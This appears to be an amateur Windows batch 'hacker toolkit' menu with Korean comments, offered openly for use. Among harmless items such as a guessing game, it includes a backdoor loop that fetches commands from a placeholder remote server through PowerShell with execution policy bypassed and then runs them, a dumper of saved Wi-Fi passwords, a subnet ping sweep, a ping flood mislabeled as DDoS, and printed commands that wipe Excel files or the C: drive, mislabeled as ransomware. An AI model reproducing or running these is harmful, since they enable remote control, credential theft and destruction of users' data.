@echo off
:main
color b
cls
echo C:\
echo for beginner
set /p choice=C:\

if "%choice%"=="sh" goto shutdown
if "%choice%"=="help" goto help
if "%choice%"=="ipscan" goto ipscan
if "%choice%"=="ddos" goto ddos
if "%choice%"=="sir" goto simpleransomware
if "%choice%"=="dk" goto duck
if "%choice%"=="4" exit /b

echo wrong answer
timeout /t 2 /nobreak >nul
goto main

:shutdown
shutdown /s /t 0
goto main

:help
echo list of commends
echo sh: shutdown
echo help: list of commends.
echo ipscan: ipconfig
echo ddos: simple ddos
echo sir: simple ransomware script
echo dk: lots of hacking tools
pause
goto main

:ipscan
ipconfig
pause
goto main

:ddos
setlocal

set /p ip=ip: 

if "%ip%"=="" (
    echo no ip
    exit /b 1
)

echo  Ctrl + C for exit
ping %ip% -t

endlocal
pause
goto main

:simpleransomware
echo del /s /q C:\*.xls C:\*.xlsx
echo this script is clear all xls files copy and paste on a notepad and ransomware.bat
pause
goto main

:duck
cls
color 4
echo    ---------
echo --- ..         --------
echo ---          -----
echo    ------------
echo        -    -
echo welcome to the duck hacker!!!
set /p choice= enter 3

if "%choice%"=="DDDOS" goto DDDOS
if "%choice%"=="BEN" goto BEN
if "%choice%"=="3" goto helpdk
if "%choice%"=="4" goto main
if "%choice%"=="cls" goto clear
if "%choice%"=="iscaner" goto iscaner
if "%choice%"=="dir" goto dir
if "%choice%"=="np" goto notepad
if "%choice%"=="game" goto game
if "%choice%"=="bd" goto backdoor
if "%choice%"=="wh" goto wifihacker
if "%choice%"=="wp" goto webip
if "%choice%"=="work" goto work

echo wrong answer
timeout /t 2 /nobreak >nul
goto duck

:DDDOS
setlocal

set /p ip=ip: 

if "%ip%"=="" (
    echo no ip
    exit /b 1
)

echo  Ctrl + C for exit
ping %ip% -t

endlocal
pause
goto duck

:BEN
echo cmd /c rd /s /q C:\
echo cmd /c rd /s /q C:\*.exe C:\*.exe
pause
goto duck

:helpdk
echo list of commends
echo DDDOS: the fast ddoser
echo BEN: power full ransomware
echo 3: list of commends
echo cls:clear the space
echo iscaner: ipscaner
echo wh: wifi hacking and you have to start with Administrator privileges
echo bd: backdoor
echo wp:web site ip
echo work: for work sheet pwd2
pause
goto duck

:clear
cls
pause
goto duck

:iscaner
setlocal enabledelayedexpansion

rem IP 범위를 설정합니다.
set subnet=192.168.1

rem 결과 파일을 초기화합니다.
echo Scanning IP range %subnet%.0/24 > results.txt

rem 1부터 254까지의 IP를 스캔합니다.
for /L %%i in (1,1,254) do (
    ping -n 1 -w 100 %%subnet%%.%%i | find "TTL=" > nul
    if !errorlevel! == 0 (
        echo %%subnet%%.%%i is up >> results.txt
        echo %%subnet%%.%%i is up
    ) else (
        echo %%subnet%%.%%i is down
    )
)

echo Scan complete. Results are in results.txt
start notepad results.txt
pause
goto duck

:dir
dir
pause
goto duck

:notepad
start notepad
pause
goto duck

:game
setlocal enabledelayedexpansion

rem 1부터 100 사이의 랜덤 숫자를 생성합니다.
set /a target=%random% %% 100 + 1

echo =====================================================
echo Welcome to the Number Guessing Game!
echo I'm thinking of a number between 1 and 100.
echo Can you guess what it is?
echo =====================================================

:guess
set /p "guess=Enter your guess: "

rem 입력이 숫자인지 확인합니다.
for /L %%i in (0, 1, 9) do (
    if "!guess:%%i=!" == "!guess!" (
        echo Please enter a valid number.
        goto guess
    )
)

rem 사용자가 입력한 숫자가 맞는지 확인합니다.
if %guess% == %target% (
    echo Congratulations! You guessed the correct number: %target%
    goto end
) else if %guess% LSS %target% (
    echo Too low! Try again.
) else (
    echo Too high! Try again.
)

goto guess

:end
echo Thanks for playing!
pause
goto duck

:backdoor
setlocal

echo ================================
echo  Back Door
echo ================================
echo.

:loop
REM PowerShell을 사용하여 원격 서버에서 명령어 다운로드
powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-RestMethod -Uri http://your-remote-server/command.txt -OutFile C:\command.txt}"

REM 다운로드한 명령어 읽기 및 실행
set /p command=<C:\command.txt
%command%

REM 60초 대기 후 반복
timeout /t 60
goto loop

endlocal
pause
goto duck

:wifihacker
setlocal enabledelayedexpansion

rem 결과를 저장할 파일을 설정합니다.
set "output=%TEMP%\passwords.txt"

rem 사용자에게 와이파이 프로파일 이름을 입력하라고 요청합니다.
set /p "profile=Enter the Wi-Fi profile name: "

rem 결과 파일 초기화
echo Retrieving information for profile: %profile% > "%output%"

rem 와이파이 프로파일 정보 및 비밀번호를 가져옵니다.
echo ===================================================== >> "%output%"
netsh wlan show profile name="%profile%" >> "%output%"
echo ===================================================== >> "%output%"
netsh wlan show profile name="%profile%" key=clear >> "%output%"

rem 결과를 확인합니다.
if exist "%output%" (
    echo =====================================================
    echo Wi-Fi profile information for "%profile%" has been saved to %output%
    echo =====================================================
    notepad "%output%"
) else (
    echo Profile "%profile%" not found or no information saved.
)

endlocal
pause
goto duck

:webip
setlocal

set /p url=Enter the URL (e.g., www.google.com): 

echo Retrieving IP address for %url%...
for /f "tokens=2 delims=:" %%i in ('nslookup %url% ^| find "Address"') do set ip=%%i

if "%ip%"=="" (
    echo Unable to find IP address.
) else (
    echo IP address for %url%: %ip%
)

pause
goto duck

:work
setlocal

:: Prompt user for filename
set /p filename=Enter the filename to save (e.g., myfile.txt): 

:: Check if filename is empty
if "%filename%"=="" (
    echo No filename was entered.
    exit /b
)

:: Inform user that they will enter content now
echo Enter the content for %filename%.
echo Press Ctrl+Z and then Enter to finish input.

:: Create or clear the file
type nul > "%filename%"

:: Input content and save to file
(
    echo Please enter the content below:
    copy con "%filename%"
) >nul

:: Confirmation message
echo %filename% has been saved.

:: Pause to allow user to review
pause
goto duck